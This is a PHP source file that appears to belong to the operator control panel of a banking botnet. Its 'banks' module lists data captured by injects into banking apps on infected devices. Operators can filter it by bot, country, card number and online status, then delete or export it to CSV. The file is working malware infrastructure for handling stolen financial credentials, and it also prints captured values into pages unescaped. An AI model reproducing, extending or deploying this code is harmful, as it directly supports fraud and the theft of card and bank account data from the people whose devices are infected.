<?php
require_once "cmd_mod.php";

class banks extends modBase
{
	protected $module_name = 'banks';

	function get_filter()
	{
		$patt = modBase::$filters['country'];
		
		$country_input = <<<PHP
<div class="col-md-2 tagsinput-primary">
		<input class="form-control tagsinput" id="banks-filter-country" pattern="{$patt}" 
			size="10" placeholder="de, gb, fr" type="text" title="Use comma for multiply values: 1,2,3" data-role="tagsinput" value="%FILTER_COUNTRY%" />
	</div>
PHP;
		$country_input = str_replace('%FILTER_COUNTRY%', hlp::get($this->filter_values, 'country', ''), $country_input);
	
		$online_input = <<<PHP
	<div class="col-md-1 textwhite">
		<label class='checkbox' for="banks-filter-only_online_bots">
			<input id="banks-filter-only_online_bots" type="checkbox" data-toggle="checkbox" %FILTER_ONLY_ONLINE_BOTS% />
		</label>
	</div>
PHP;

		$chk = (hlp::get($this->filter_values, 'only_online_bots', false))? 'checked' : '';
		$online_input = str_replace('%FILTER_ONLY_ONLINE_BOTS%', $chk, $online_input);
		
		$fields = array(
		// id, name, placeholder, custom_pattern, is_like
			array('bot_id', 'Bot ID', 'Bot ID'),
			array('bot_comment', 'Bot comment', 'Part of any your comments'),
			array('Country', $country_input),
			array('number', 'Card number', '1234 1234 1234 1234', modBase::$filters['cc']),
			array('Online only', $online_input),
		);
		
		return $this->build_filter($fields);
	}
	
	function get_content()
	{
		$comment = '';
		if(isset($this->filter_values['bot_comment']))
		{
			$comment = trim($this->filter_values['bot_comment']);
			unset($this->filter_values['bot_comment']);
		}
		
		$only_online = 0;
		if(isset($this->filter_values['only_online_bots']))
		{
			$only_online = ($this->filter_values['only_online_bots'])? 1 : 0;
			unset($this->filter_values['only_online_bots']);
		}

		$fields = "bot_banks.id, inject_id, {$this->client_cfg['db_main']}.injects.app, bot_banks.bot_id, data, ts, bot_banks.comment";
		if($comment || $only_online)
		{
			$sql = "select %FIELDS% from bot_banks 
				INNER JOIN bots ON bots.bot_id=bot_banks.bot_id
				INNER JOIN {$this->client_cfg['db_main']}.injects ON {$this->client_cfg['db_main']}.injects.id=bot_banks.inject_id
			";
			
			if($comment)
				$sql = $this->addWhere($sql, "bots.comment like({$this->db->quote_like($comment)})", 'bot_banks');
			
			if($only_online)
				$sql = $this->addWhere($sql, "is_online(bots.timestamp)=1", 'bot_banks');

		}else{
			
			$sql = "select %FIELDS% from bot_banks
			INNER JOIN {$this->client_cfg['db_main']}.injects ON {$this->client_cfg['db_main']}.injects.id=bot_banks.inject_id";
		}
		
		$sql = $this->addWhere($sql, $this->filter_values, array('bot_id', 'country'), 'bot_banks');
		$sql .= " order by `ts` desc";

		// count request
		$total_rows = $this->db->exec(str_replace('%FIELDS%', 'count(bot_banks.id)', $sql), null, true)[0][0];

		$paging = $this->get_limit($total_rows, $this->results_on_page);
		$sql .= $paging['sql'];

		// data request
		$data = $this->db->exec(str_replace('%FIELDS%', $fields, $sql), null, true);

		$headers = array();
		$headers[] = '<a href="javascript:select_all(\'input[id^=&quot;banks-table-chk-&quot;]\');undefined"><span class="fui-checkbox-checked" title="Check all"></span></a>';
		$headers[] = 'Received at';
		$headers[] = 'Bot';
		$headers[] = 'App';
		$headers[] = 'Data';
		$headers[] = 'Comment';
		$headers[] = 'Action';
	
		$rows = array();
		foreach($data as $row)
		{
			$tmp = array();

			$tmp[] = "<label class='checkbox' for='banks-table-chk-{$row['id']}'>
					<input type='checkbox' value='{$row['id']}' id='banks-table-chk-{$row['id']}' data-toggle='checkbox' />
				</label>";

			$tmp[] = hlp::human_date($row['ts']);
			$tmp[] = "<a onmouseout='hide_bot_details()' onmouseover='show_bot_details(this, \"{$row['bot_id']}\")' href='#page:menu-bot;bot_id={$row['bot_id']}'>Details</a>";
			$tmp[] = "<a title='Open inject details' href='#page:menu-injects;appname={$row['app']}'>{$row['app']}</a>";
			
			if($row['data'])
			{
				$data = '';
				$fields = json_decode($row['data'], true);
				
				if($fields)
				foreach($fields as $key=>$val)
					$data .= "{$key}: {$val}\n";
			}else
				$data = '';
			
			$tmp[] = "<textarea rows='2' class='form-control'>{$data}</textarea>";

			$tmp[] = $this->get_comment_cell($row);
			$tmp[] = "<button type='button' class='btn btn-danger' onclick='show_ajax_form(\"panel_delete_banks\", [{$row['id']}])'>Delete</button>";
			
			$rows[] = $tmp;
		}

		$content = $this->get_table($rows, $headers, 'textcenter');
		
		// TODO show bot details - online status, banks, other details
		$paging = $this->get_limit($total_rows, $this->results_on_page);
		
		$buttons = array(
			array('Delete', 'Delete all selected items', 'show_ajax_form("panel_delete_banks")', 'danger'),
			array('Export', 'Export all selected items', 'export_txt_csv("banks")', 'info'),
		);
		
		return $this->wrap_content("Total: {$paging['total_rows']}", $content, $paging['pages'], $buttons);
	}
}
